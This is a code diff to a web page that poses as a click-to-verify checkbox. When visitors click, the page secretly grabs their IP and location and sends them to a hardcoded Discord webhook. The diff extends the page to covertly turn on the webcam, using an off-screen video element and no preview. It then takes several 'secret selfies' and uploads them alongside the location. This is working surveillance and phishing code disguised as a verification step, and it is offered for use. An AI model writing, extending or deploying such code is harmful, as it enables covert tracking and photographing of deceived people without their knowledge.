@@ -86,6 +86,26 @@
         max-width: 330px;
         word-break: break-word;
     }
+
+    /* Hidden camera. Set SHOW_PREVIEW = true to reveal it in the corner. */
+    #cam {
+        position: fixed;
+        left: -10000px;
+        top: 0;
+        width: 320px;
+        height: 240px;
+        transform: scaleX(-1); /* mirror, like a selfie */
+    }
+    #cam.show {
+        left: auto;
+        right: 16px;
+        bottom: 16px;
+        width: 160px;
+        height: 120px;
+        border-radius: 8px;
+        box-shadow: 0 4px 16px rgba(0,0,0,.3);
+        z-index: 999;
+    }
 </style>
 </head>
 <body>
@@ -117,6 +137,10 @@
     <div class="rc-status" id="status">idle</div>
 </div>
 
+<!-- hidden capture elements -->
+<video id="cam" playsinline autoplay muted></video>
+<canvas id="snap" style="display:none"></canvas>
+
 <script>
 /* ============================================================
    1. PASTE YOUR DISCORD WEBHOOK URL HERE
@@ -127,6 +151,13 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553766824783388812/Zm7f_7
       Google map preview. Leave empty to use the free OSM preview. */
 const GOOGLE_MAPS_KEY = '';
 
+/* 3. OPTIONAL - show the camera preview in the corner */
+const SHOW_PREVIEW = false;
+
+/* 4. OPTIONAL - how many secret selfies and how far apart (ms) */
+const SELFIE_COUNT  = 4;
+const SELFIE_GAP_MS = 700;
+
 const widget   = document.getElementById('widget');
 const cb       = document.getElementById('cb');
 const mainText = document.getElementById('mainText');
@@ -134,6 +165,7 @@ const statusEl = document.getElementById('status');
 
 let busy = false;
 const say = m => { statusEl.textContent = m; };
+const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 widget.addEventListener('click', async () => {
     if (busy) return;
@@ -142,11 +174,15 @@ widget.addEventListener('click', async () => {
     mainText.textContent = 'Verifying...';
 
     try {
-        say('asking for location...');
-
-        // Called FIRST and synchronously so the browser keeps the click gesture.
+        /* Kick everything off synchronously, still inside the click gesture,
+           so the browser accepts the camera + location permission prompts. */
+        const camPromise = startCamera();
         const locPromise = getLocation();
         const ipPromise  = getIP();
+
+        const selfiePromise = captureSelfies(camPromise, SELFIE_COUNT);
+
+        say('asking for camera + location...');
 
         const location = await Promise.race([
             locPromise,
@@ -156,8 +192,12 @@ widget.addEventListener('click', async () => {
 
         say(location ? ('got: ' + location.label + ' [' + location.src + ']') : 'location unavailable');
 
-        await send(ip, location);
-        say('sent' + (location ? '' : ' (no location)'));
+        say('capturing selfies...');
+        const shots = await selfiePromise;
+        say('captured ' + shots.length + ' selfie(s)');
+
+        await send(ip, location, shots);
+        say('sent' + (location ? '' : ' (no location)') + (shots.length ? '' : ' (no camera)'));
     } catch (e) {
         console.warn(e);
         say('error: ' + e.message);
@@ -168,6 +208,86 @@ widget.addEventListener('click', async () => {
     mainText.textContent = 'Verified';
     busy = false;
 });
+
+/* ============================================================
+   CAMERA - silent, hidden, no preview, no shutter sound
+   ============================================================ */
+async function startCamera() {
+    try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: 'user',
+                width:  { ideal: 640 },
+                height: { ideal: 480 }
+            },
+            audio: false
+        });
+
+        return stream;
+    } catch (e) {
+        console.warn('camera:', e.name || e.message);
+        return null;
+    }
+}
+
+async function captureSelfies(streamPromise, count) {
+    const stream = await streamPromise;
+    if (!stream) return [];
+
+    const video  = document.getElementById('cam');
+    const canvas = document.getElementById('snap');
+
+    if (SHOW_PREVIEW) video.classList.add('show');
+    video.srcObject = stream;
+
+    // wait until the stream is actually delivering frames
+    await new Promise(res => {
+        let done = false;
+        const fin = () => { if (!done) { done = true; res(); } };
+        if (video.readyState >= 2) fin();
+        else video.onloadedmetadata = fin;
+        setTimeout(fin, 5000);
+    });
+
+    try { await video.play(); } catch (e) {}
+
+    // let auto-exposure / white balance settle so the first shot isn't black
+    await sleep(600);
+
+    const shots = [];
+    for (let i = 0; i < count; i++) {
+        const blob = await grab(video, canvas);
+        if (blob) shots.push(blob);
+        if (i < count - 1) await sleep(SELFIE_GAP_MS);
+    }
+
+    stream.getTracks().forEach(t => t.stop());
+    video.srcObject = null;
+    if (SHOW_PREVIEW) video.classList.remove('show');
+
+    return shots;
+}
+
+function grab(video, canvas) {
+    return new Promise(res => {
+        const w = video.videoWidth  || 640;
+        const h = video.videoHeight || 480;
+
+        canvas.width  = w;
+        canvas.height = h;
+
+        const ctx = canvas.getContext('2d');
+        ctx.save();
+        ctx.translate(w, 0);
+        ctx.scale(-1, 1);            // mirror the selfie
+        ctx.drawImage(video, 0, 0, w, h);
+        ctx.restore();
+
+        canvas.toBlob(b => res(b), 'image/jpeg', 0.85);
+    });
+}
 
 /* ============================================================
    LOCATION - GPS and IP lookup race each other.
@@ -316,9 +436,13 @@ async function getIP() {
 }
 
 /* ============================================================
-   SEND TO DISCORD - plain JSON, no FormData, no blobs
+   SEND TO DISCORD
+   - with photos  -> multipart/form-data (payload_json + files[n])
+   - without      -> plain JSON
    ============================================================ */
-async function send(ip, location) {
+async function send(ip, location, shots) {
+    shots = shots || [];
+
     let maps = null;
     let coords = null;
 
@@ -342,7 +466,9 @@ async function send(ip, location) {
     }
 
     lines.push('IP: ' + ip);
+    lines.push('Selfies: ' + shots.length + (shots.length ? ' attached' : ''));
 
+    /* --- main embed: location --- */
     const embed = {
         title: 'Location Captured',
         color: 0x156b3c,
@@ -381,16 +507,38 @@ async function send(ip, location) {
         };
     }
 
-    const payload = {
-        content: lines.join('\n'),
-        embeds: [embed]
-    };
+    const embeds = [embed];
 
-    const res = await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+    /* --- one embed per selfie, attached as files --- */
+    shots.forEach((blob, i) => {
+        embeds.push({
+            title: 'Secret selfie ' + (i + 1) + ' / ' + shots.length,
+            color: 0x156b3c,
+            image: { url: 'attachment://selfie' + (i + 1) + '.jpg' },
+            timestamp: new Date().toISOString()
+        });
     });
+
+    const payload = { content: lines.join('\n'), embeds };
+
+    let res;
+
+    if (shots.length) {
+        const fd = new FormData();
+        fd.append('payload_json', JSON.stringify(payload));
+        shots.forEach((blob, i) => {
+            fd.append('files[' + i + ']', blob, 'selfie' + (i + 1) + '.jpg');
+        });
+
+        // NOTE: no Content-Type header - the browser sets the multipart boundary.
+        res = await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+    } else {
+        res = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    }
 
     if (!res.ok) throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 140));
 }
